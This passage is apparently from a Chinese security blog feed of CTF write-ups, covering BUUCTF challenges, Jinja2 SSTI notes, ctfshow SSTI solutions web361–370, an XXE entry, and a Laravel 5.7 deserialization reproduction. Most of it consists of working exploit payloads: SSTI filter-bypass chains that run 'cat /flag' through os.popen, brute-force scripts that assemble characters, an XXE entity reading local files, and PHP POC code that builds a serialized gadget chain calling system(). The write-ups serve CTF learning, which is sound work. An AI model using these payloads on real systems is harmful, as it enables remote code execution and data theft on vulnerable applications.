&#125;&#125;if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;// 不能同时  GET 和 POST 都没设置 flag    exit($yds);&#125;if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;)&#123;// 任意都不能满足 flag === &#39;flag&#39;    exit($is);&#125;echo &quot;the flag is: &quot;.$flag;</code></pre><p>看了一下wp，在三个判断中有三种变量覆盖解法：</p><p>1、利用handsome</p><pre><code>?handsome=flag&amp;flag=dd&amp;dd=xxx</code></pre><p>2、利用yds</p><pre><code>?yds=flag</code></pre><p>3、利用is</p><pre><code>?is=flag&amp;flag=flag</code></pre><h3 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h3><p>查看源代码：</p><img src="/2023/08/03/buuctf/213947.png" class=""><p>直接可以进入flag.php:</p><img src="/2023/08/03/buuctf/214134.png" class=""><p>通过这两句话的提示，我们尝试在请求包中加入X-Forwarded-For: 127.0.0.1</p><p>最后成功获得flag</p><h3 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h3><p>输入前三个商品的价格：</p><img src="/2023/08/03/buuctf/223742.png" class=""><p>输入最后一个商品：</p><img src="/2023/08/03/buuctf/223958.png" class=""><p>告诉了我们只能使用一个字符，一个字符能够购买的就只有前三只独角兽，虽然我也没有购买成功hhh</p><p>所以猜测只要购买了第四只独角兽，就能获取flag</p><p>于是我们需要找到单个字符utf-8解码后比1337大的数字</p><p>这里有其他师傅给的网站：</p><p><a href="https://www.compart.com/en/unicode">https://www.compart.com/en/unicode</a></p><p>搜索：<code>thousand</code>，选择一个<strong>Numeric Value</strong>大于<code>1337</code>的字符：</p><img src="/2023/08/03/buuctf/225226.png" class=""><img src="/2023/08/03/buuctf/225417.png" class=""><p>将<code>0xE2 ox86 ox88</code>的0x换成%然后传参即可成功获得flag</p><p>这道题其实可以直接传”万”字通过</p>]]></content>
      
      
      
        <tags>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI模板注入</title>
      <link href="/2023/07/25/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/07/25/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>常见的模板引擎有</p><pre><code>1.php 常用的SmartySmarty算是一种很老的PHP模板引擎了，非常的经典，使用的比较广泛TwigTwig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。BladeBlade 是 Laravel 提供的一个既简单又强大的模板引擎。和其他流行的 PHP 模板引擎不一样，Blade 并不限制你在视图中使用原生 PHP代码。所有 Blade 视图文件都将被编译成原生的 PHP 代码并缓存起来，除非它被修改，否则不会重新编译，这就意味着 Blade基本上不会给你的应用增加任何额外负担。2.Java 常用的JSP这个引擎我想应该没人不知道吧，这个应该也是我最初学习的一个模板引擎，非常的经典FreeMarkerFreeMarker是一款模板引擎：即一种基于模板和要改变的数据，并用来生成输出文本（HTML网页、电子邮件、配置文件、源代码等）的通用工具。它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。VelocityVelocity作为历史悠久的模板引擎不单单可以替代JSP作为JavaWeb的服务端网页模板引擎，而且可以作为普通文本的模板引擎来增强服务端程序文本处理能力。3.Python 常用的Jinja2flask jinja2 一直是一起说的，使用非常的广泛，是我学习的第一个模板引擎djangodjango 应该使用的是专属于自己的一个模板引擎，我这里姑且就叫他 django，我们都知道django 以快速开发著称，有自己好用的ORM，他的很多东西都是耦合性非常高的，你使用别的就不能发挥出 django 的特性了tornadotornado 也有属于自己的一套模板引擎，tornado 强调的是异步非阻塞高并发</code></pre><p>检测到模板注入后，我们需要判断具体的模板引擎：</p><img src="/2023/07/25/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/888888.png" class=""><p>这里的绿线表示结果成功返回，红线反之。有些时候，同一个可执行的 payload 会在不同引擎中返回不同的结果，比方说49会在 Twig 中返回49，而在 Jinja2 中则是7777777。</p><h1 id="python中的SSTI"><a href="#python中的SSTI" class="headerlink" title="python中的SSTI"></a>python中的SSTI</h1><h3 id="jinjia2"><a href="#jinjia2" class="headerlink" title="jinjia2"></a>jinjia2</h3><p>flask常用注入模块：</p><img src="/2023/07/25/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/164120.png" class=""><p>搬一下bfengj师傅的笔记：</p><pre><code>引导类：()/[]/&#39;&#39;/&quot;&quot;/&#123;&#125;/数字/x(这里的x任意26个英文字母的任意组合都可以)    虚空类，可以这样&#123;&#123;x.__class__.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__['os'].popen('ls').read() &#125;&#125;url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#39;__builtins__&#39;]含有current_app（当前app）。get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且get_flashed_messages.__globals__[&#39;__builtins__&#39;]含有current_app。lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__['os'].popen('ls').read()&#125;&#125;魔术方法：__class__            类的一个内置属性，表示类型的所属对象。__base__             类型对象的直接基类（直接父类）__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases____mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找全部基类及当前类。__subclasses__()     返回当前类的子类集合__init__             初始化类，返回的类型是function（查看类是否重载，重载是指程序在运行时就已经加载好了这个类到内存中，如果出现wrapper字眼，说明没有重载）__globals__          使用方式是 function名.__globals__获取function所处空间下可使用的module、方法以及所有变量。__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#39;b&#39;]，就是a.__getitem__(&#39;b&#39;)注：__getitem__()也可以用get()来代替__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()]__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。current_app          应用上下文，一个全局变量。g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#39;flask_ssti&#39;&gt;</code></pre><pre><code>request                 可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;/proc\self\fd/3&#39;).read()request.args.x1    get传参request.values.x1  所有参数request.cookies.x1       cookies参数request.headers         请求头参数request.form.x1    post传参(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)request.data   post传参(Content-Type:a/b)request.json post传json  (Content-Type: application/json)</code></pre><pre><code>&#123;&#123;&#125;&#125;称之为变量代码块；&#123;%%&#125;称之为控制代码块，可以实现一些语言层次的功能，比如循环语句。不同语言不同模板的代码块形式不同</code></pre><p>过滤器（例：()|select|string|list）</p><pre><code>int()：将值转换为int类型；float()：将值转换为float类型；lower()：将字符串转换为小写；upper()：将字符串转换为大写；title()：把值中的每个单词的首字母都转成大写；capitalize()：把变量值的首字母转成大写，其余字母转小写；trim()：截取字符串前面和后面的空白字符；wordcount()：计算一个长字符串中单词的个数；reverse()：字符串反转；replace(value,old,new)： 替换将old替换为new的字符串；truncate(value,length=255,killwords=False)：截取length长度的字符串；striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;'<em>hello</em>'|safe&#125;&#125;；list()：将变量列成列表；string()：将变量转换成字符串；join()：将一个序列中的参数值拼接成字符串。例如得到把字典的键名拼接后的值abs()：返回一个数值的绝对值；first()：返回一个序列的第一个元素；last()：返回一个序列的最后一个元素；format(value,arags,*kwargs)：格式化字符串。比如：&#123;&#123; "%s" - "%s"|format('Hello?',"Foo!") &#125;&#125;将输出：Helloo? - Foo!length()：返回一个序列或者字典的长度；sum()：返回列表内数值的和；sort()：返回排序后的列表；default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#39;xiaotuo&#39;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。length()返回字符串的长度，别名是count</code></pre><h1 id="php中的SSTI"><a href="#php中的SSTI" class="headerlink" title="php中的SSTI"></a>php中的SSTI</h1><h3 id="smart"><a href="#smart" class="headerlink" title="smart"></a>smart</h3><p>参考：</p><p><a href="https://xz.aliyun.com/t/3679">flask之ssti模版注入从零到入门</a></p><p><a href="https://xz.aliyun.com/t/6885">Python模板注入(SSTI)深入学习</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/110220425">jinjia2模板注入绕过（进阶篇）</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">SSTI模板注入总结</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI注入(ctfshow)</title>
      <link href="/2023/07/25/SSTI%E6%B3%A8%E5%85%A5(ctfshow)/"/>
      <url>/2023/07/25/SSTI%E6%B3%A8%E5%85%A5(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h3 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h3><p>payload（调用了“os_wrap_close”）:</p><pre><code>?name=&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']("cat /flag").read()&#125;&#125;</code></pre><p>or</p><pre><code>?name=&#123;&#123;''.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125; //使用内建名称空间</code></pre><h3 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h3><p>这关好像是频闭了父类下面的所有子类</p><p>payload</p><pre><code>?name=&#123;&#123;config.__class__.__init__.__globals__.__builtins__['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></pre><p>or</p><pre><code>?name=&#123;&#123;config.__class__.__init__.__globals__['os'].popen('cat /flag').read()&#125;&#125;</code></pre><p>or</p><pre><code>?name=&#123;&#123;x.__class__.__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;//这里的x任意26个英文字母的任意组合都可以</code></pre><h3 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h3><p>这关过滤了单双引号</p><p>参考：<a href="https://xz.aliyun.com/t/6885">https://xz.aliyun.com/t/6885</a></p><p>我们可以使用request.args来绕过此处引号的过滤。</p><p>request.args是flask中一个存储着请求参数以及其值的字典</p><pre><code>?name=&#123;&#123;[].__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.a][request.args.b](request.args.c)&#125;&#125;&amp;a=__builtins__&amp;b=eval&amp;c=__import__(&#39;os&#39;).popen(&quot;ls&quot;).read()</code></pre><p>也可以考虑字符串拼接，这里用config拿到字符串，比较麻烦就不全演示了</p><pre><code>?name=&#123;&#123;url_for.__globals__[(config.__str__()[2])%2B(config.__str__()[42])]&#125;&#125;</code></pre><p>相当于?name&#x3D;</p><h3 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h3><p>这关过滤了引号和args，用request.from提交发现不允许，但可以用cookies</p><pre><code>?name=&#123;&#123;url_for.__globals__[request.cookies.a][request.cookies.b](request.cookies.c).read()&#125;&#125;Cookie: a=os;b=popen;c=ls</code></pre><p>还可以用chr()函数绕过</p><p><strong>中括号实际上影响我们的只有从数组中取值，例如__bases__()[1]，而后续的中括号实际是不必要的，globals[“os”]可以替换为globals.os</strong></p><p>所以首先fuzz一下chr()函数在哪：</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[§0§].__init__.__globals__.__builtins__.chr&#125;&#125;</code></pre><img src="/2023/07/25/SSTI%E6%B3%A8%E5%85%A5(ctfshow)/163654.png" class=""><p>可以看到爆出了很多，随便选一个</p><pre><code>&#123;&#123;().__class__.__bases__[0].__subclasses__()[227].__init__.__globals__.__builtins__.chr&#125;&#125;</code></pre><p>接着尝试使用chr尝试绕过后续所有的引号：</p><pre><code>&#123;%set+chr=[].__class__.__bases__[0].__subclasses__()[227].__init__.__globals__.__builtins__.chr%&#125;&#123;&#123;[].__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[chr(111)%2bchr(115)][chr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)](chr(108)%2bchr(115)).read()&#125;&#125;</code></pre><h3 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h3><p>过滤了中括号，但过滤了中括号实际上影响我们的只有从数组中取值，而从数组中取值可以使用pop&#x2F;<strong>getitem</strong>等数组自带方法。不过还是建议用<strong>getitem</strong>，因为pop会破坏数组的结构。</p><p>a[0]与a.<strong>getitem</strong>(0)的效果是一样的，所以上述payload可以用此来绕过：</p><pre><code>?name=&#123;&#123;&#123;&#125;.__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(132).__init__.__globals__.popen(request.cookies.a).read()&#125;&#125;</code></pre><p>这里也尝试用一下字符串拼接，写个python脚本跑出来：</p><pre><code>import requestsurl=&quot;http://24d7f73c-6e64-4d9c-95a7-abe78558771a.chall.ctf.show:8080/?name=&#123;&#123;config.__str__().__getitem__(%d)&#125;&#125;&quot;payload=&quot;cat /flag&quot;result=&quot;&quot;for j in payload:    for i in range(0,1000):        r=requests.get(url=url%(i))        location=r.text.find(&quot;&lt;h3&gt;&quot;)        word=r.text[location+4:location+5]        if word==j:            print(&quot;config.__str__().__getitem__(%d)  ==  %s&quot;%(i,j))            result+=&quot;config.__str__().__getitem__(%d)~&quot;%(i)            breakprint(result[:len(result)-1])</code></pre><pre><code>?name=&#123;&#123;url_for.__globals__.os.popen(config.__str__().__getitem__(22)~config.__str__().__getitem__(40)~config.__str__().__getitem__(23)~config.__str__().__getitem__(7)~config.__str__().__getitem__(279)~config.__str__().__getitem__(4)~config.__str__().__getitem__(41)~config.__str__().__getitem__(40)~config.__str__().__getitem__(6)).read()&#125;&#125;</code></pre><p>注：<code>__getitem__()</code>也可以用<code>get()</code>来代替</p><h3 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h3><p>在之前的基础上又ban了<code>_</code>,用url_for.(request.cookies.a)的话会500，这关就用flask自带的过滤器attr</p><p>参考<a href="https://docs.jinkan.org/docs/jinja2/templates.html#id36">https://docs.jinkan.org/docs/jinja2/templates.html#id36</a></p><p>例如foo|attr(“bar”)的意思就是foo[“bar”]</p><p>payload</p><pre><code>?name=&#123;&#123;(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).eval(request.cookies.x5)&#125;&#125;Cookie传参：x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__(&#39;os&#39;).popen(&#39;cat /f*&#39;).read()</code></pre><p>or</p><pre><code>?name=&#123;&#123;(lipsum|attr(request.cookies.a)).os.popen(request.cookies.b).read()&#125;&#125;传参：a=__globals__;b=cat /f*</code></pre><h3 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h3><p>过滤了os</p><p>payload</p><pre><code>?name=&#123;&#123;(lipsum|attr(request.cookies.a)|attr(request.cookies.b))(request.cookies.c).popen(request.cookies.d).read()&#125;&#125;a=__globals__;b=__getitem__;c=os;d=cat /f*</code></pre><h3 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h3><pre><code>ban了&#123;\&#123;，就要想办法拿&#123;% %&#125;来绕过。把上一题的改一下就能直接用了：</code></pre><pre><code>?name=&#123;%print((lipsum|attr(request.cookies.a)|attr(request.cookies.b))(request.cookies.c).popen(request.cookies.d).read())%&#125;a=__globals__;b=__getitem__;c=os;d=cat /f*</code></pre><h3 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h3><p>ban了request，就想办法自己凑字符了，这里拿config来凑。但是一个问题是_被ban了，所以__str__()用不了，这里拿string过滤器来得到config的字符串：config|string，但是获得字符串后本来应该用中括号或者__getitem__()，但是问题是_被ban了，所以获取字符串中的某个字符比较困难，这里转换成列表，再用列表的pop方法就可以成功得到某个字符了，在跑字符的时候发现没有小写的b，只有大写的B，所以再去一层.lower()方法，方便跑更多字符，写个脚本：</p><pre><code>import requestsurl=&quot;http://8db9791d-549f-4151-a095-6bfbce54ba2b.challenge.ctf.show/?name=&#123;&#123;% print (config|string|list).pop(&#123;&#125;).lower() %&#125;&#125;&quot;payload=&quot;cat /flag&quot;raws=&quot;&quot;for i in payload:    for j in range(0,1000):        result=requests.get(url=url.format(j))        location=result.text.find(&quot;&lt;h3&gt;&quot;)        ak=result.text[location+4:location+5]        if(ak==i):            print(&quot;(config|string|list).pop(&#123;&#125;).lower==&#123;&#125;&quot;.format(j,i))            raws+=&quot;(config|string|list).pop(&#123;&#125;).lower()~&quot;.format(j)            breakprint(raws)</code></pre><p>最终payload</p><pre><code>?name=&#123;% print ((lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read()) %&#125;</code></pre><p>还有一种yu师傅的姿势</p><pre><code>http://de1d82f0-b40d-430f-9cb5-ce2435f44306.chall.ctf.show:8080/?name=&#123;% set a=(()|select|string|list).pop(24) %&#125;&#123;% set globals=(a,a,dict(globals=1)|join,a,a)|join %&#125;&#123;% set init=(a,a,dict(init=1)|join,a,a)|join %&#125;&#123;% set builtins=(a,a,dict(builtins=1)|join,a,a)|join %&#125;&#123;% set a=(lipsum|attr(globals)).get(builtins) %&#125;&#123;% set chr=a.chr %&#125;&#123;% print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %&#125;</code></pre><p>这是新的拼接字符的方式，例如:</p><pre><code>&#123;% set a=dict(o=oo,s=ss)|join %&#125;</code></pre><p>这样得到的a就是把这个字典的键名拼接后的值，即os</p><h3 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h3><p>ban了数字，可以把一些东西转string再转list，然后用index，然后基本上所有数字都可以拿到</p><pre><code>&#123;% set o=(dict(o=z)|join) %&#125;&#123;% set n=dict(n=z)|join %&#125;&#123;% set f=dict(f=z)|join %&#125;&#123;% set ershisi=(()|select|string|list).index(o)*(()|select|string|list).index(n) %&#125;&#123;% set liushisi=(()|select|string|list).index(o)*(()|select|string|list).index(o) %&#125;&#123;% set qi=(config|string|list).index(n)%2B(config|string|list).index(f)%&#125;&#123;% set xiegang=(config|string|list).pop(-liushisi) %&#125;&#123;% set gang=(()|select|string|list).pop(ershisi) %&#125;&#123;% set kongge=(config|string|list).pop(qi)%&#125;&#123;% set globals=(gang,gang,(dict(globals=z)|join),gang,gang)|join %&#125;&#123;% set builtins=(gang,gang,(dict(builtins=z)|join),gang,gang)|join %&#125;&#123;% set gangfulaige=(dict(cat=d)|join,kongge,xiegang,dict(flag=z)|join)|join %&#125;&#123;% set ha=dict(o=x,s=k)|join%&#125;&#123;% print (lipsum|attr(globals)).get(ha).popen(gangfulaige).read() %&#125;</code></pre><p>yu师傅的姿势，可以用length很方便的得到数字：</p><pre><code>&#123;% set one=(dict(c=z)|join|length) %&#125;&#123;% set two=(dict(cc=z)|join|length) %&#125;</code></pre><p>还有一种用过滤器int得到数字的方式：</p><pre><code>&#123;% set ten=(dict(aaaaaaaaaa=a)|join|count)%&#125;&#123;% set two=(dict(aa=a)|join|count)%&#125;&#123;% set twofour=( two~four)|int%&#125;&#123;% set a=(()|select|string|list).pop(twofour)%&#125;&#123;% set chr=a.chr%&#125;&#123;% print a.open(chr((four~seven)|int)~chr((ten~two)|int)~chr((ten~eight)|int)~chr((nine~seven)|int)~chr((ten~three)|int)).read()%&#125;</code></pre><h3 id="web371-372"><a href="#web371-372" class="headerlink" title="**web371~372"></a>**web371~372</h3>]]></content>
      
      
      
        <tags>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xxe(ctfshow)</title>
      <link href="/2023/07/07/xxe(ctfshow)/"/>
      <url>/2023/07/07/xxe(ctfshow)/</url>
      
        <content type="html"><![CDATA[<h3 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h3><pre><code>// 允许加载外部实体 一个实体由三部分构成: 一个和号 (&amp;), 一个实体名称, 以及一个分号 ( ; )libxml_disable_entity_loader(false);// xml文件来源于数据流$xmlfile = file_get_contents(&#39;php://input&#39;);if(isset($xmlfile))&#123;    $dom = new DOMDocument();      // 加载xml实体，参数为替代实体、加载外部子集    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);      // 把 DOM 节点转换为 SimpleXMLElement 对象    $creds = simplexml_import_dom($dom);      // 节点嵌套    $ctfshow = $creds-&gt;ctfshow;    echo $ctfshow;&#125;</code></pre><p>burpsuite发包，不能用hackbar</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE payload [&lt;!ELEMENT payload ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;flag&gt;&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;&lt;/flag&gt;</code></pre><img src="/2023/07/07/xxe(ctfshow)/213422.png" class=""><h3 id="web374-378"><a href="#web374-378" class="headerlink" title="web374~378"></a>web374~378</h3>]]></content>
      
      
      
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>laravel5.7反序列化漏洞复现</title>
      <link href="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>和yii一样，Laravel也是一套简洁、优雅的PHPWeb开发框架（PHP Web Framework）。</p><h2 id="环境部署："><a href="#环境部署：" class="headerlink" title="环境部署："></a>环境部署：</h2><p>下载源码：</p><pre><code>https://github.com/laravel/laravel/tree/5.7</code></pre><p>然后就是构造一个反序列化的利用点了，在routes&#x2F;web.php里面加一条路由：</p><pre><code>Route::get(&#39;/unserialize&#39;,&quot;UnserializeController@uns&quot;);  //类名@方法名</code></pre><p>在App\Http\Controllers下面写一个控制器UnserializeController.php文件：</p><pre><code>&lt;?phpnamespace App\Http\Controllers;class UnserializeController extends Controller&#123;    public function uns()&#123;        if(isset($_GET[&#39;c&#39;]))&#123;            unserialize($_GET[&#39;c&#39;]);        &#125;else&#123;            highlight_file(__FILE__);        &#125;        return &quot;uns&quot;;    &#125;&#125;</code></pre><h2 id="反序列化链分析："><a href="#反序列化链分析：" class="headerlink" title="反序列化链分析："></a>反序列化链分析：</h2><p>漏洞链的起点在vendor\laravel\framework\src\Illuminate\Foundation\Testing\PendingCommand.php，与5.6相比，5.7多了一个<code>PendingCommand.php</code>文件。</p><p>看一下这个新增的类，发现有一个<code>__destruct()</code></p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/170946.png" class=""><p><code>$this-&gt;hasExecuted</code>默认是false的，所以可以直接进入run方法：</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/171403.png" class=""><p>要想执行到异常处理代码<code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code>中得先经过 $this-&gt;mockConsoleOutput()：</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/173138.png" class=""><p>一堆看不懂的代码，来个poc试试：</p><pre><code>&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public function __construct()&#123;            $this-&gt;command=&quot;system&quot;;            $this-&gt;parameters[]=&quot;dir&quot;;        &#125;    &#125;&#125;namespace&#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;</code></pre><p>生成payload，然后传值过去：</p><pre><code>http://127.0.0.1/laravel-5.7/public/index.php/unserialize?c=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22dir%22%3B%7D%7D</code></pre><p>报错了：</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/204918.png" class=""><p>打一下断点，发现是mockConsoleOutput()方法中的createABufferedOutputMock()函数：</p><pre><code>foreach ($this-&gt;test-&gt;expectedOutput as $i =&gt; $output) &#123;</code></pre><p>报错的原因就是因为<code>$this-&gt;test</code>没有expectedOutput这个属性。跟进一下这个属性，发现这个属性在<code>trait InteractsWithConsole</code>中，trait类我们没法实例化，此外就只有一些测试类有这个属性，因此这里就卡住了。这时候想到利用__get方法</p><p>大师傅们经过寻找，选择了Illuminate\Auth\GenericUser类：</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/155543.png" class=""><p>在这里对类的加载有个疑问，后来在一篇文章中找到了：</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/100933.png" class=""><p><code>attributes</code>是可控的，因此直接构造即可。<br>而且，会发现<code>mockConsoleOutput()</code>方法中也有类似的代码：</p><pre><code>foreach ($this-&gt;test-&gt;expectedQuestions as $i =&gt; $question) &#123;</code></pre><p>因此构造：</p><pre><code>&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    use Illuminate\Auth\GenericUser;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public $test;        public function __construct()&#123;            $this-&gt;command=&quot;system&quot;;            $this-&gt;parameters[]=&quot;dir&quot;;            $this-&gt;test=new GenericUser();        &#125;    &#125;&#125;namespace Illuminate\Auth&#123;    class GenericUser    &#123;        protected $attributes;        public function __construct()&#123;            $this-&gt;attributes[&#39;expectedOutput&#39;]=[&#39;hello&#39;,&#39;world&#39;];            $this-&gt;attributes[&#39;expectedQuestions&#39;]=[&#39;hello&#39;,&#39;world&#39;];        &#125;    &#125;&#125;namespace&#123;    use Illuminate\Foundation\Testing\PendingCommand;    echo urlencode(serialize(new PendingCommand()));&#125;</code></pre><p>还是报错：</p><pre><code>“Call to a member function bind() on null”</code></pre><p>意思是在null上调用成员函数bind()</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/084006.png" class=""><p>原因应该是没有构造$this-&gt;app，看一下app:</p><img src="/2023/05/30/laravel5.7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/084501.png" class=""><p>继续构造：</p><pre><code>&lt;?phpnamespace Illuminate\Foundation\Testing&#123;    use Illuminate\Auth\GenericUser;    use Illuminate\Foundation\Application;    class PendingCommand    &#123;        protected $command;        protected $parameters;        public $test;        protected $app;        public function __construct()&#123;            $this-&gt;command=&quot;system&quot;;            $this-&gt;parameters[]=&quot;dir&quot;;            $this-&gt;test=new GenericUser();            $this-&gt;app=new Application();        &#125;    &#125;&#125;namespace Illuminate\Foundation&#123;    class Application&#123;    &#125;&#125;namespace Illuminate\Auth&#123;    class GenericUser    &#123;        protected $attributes;        public function __construct()&#123;            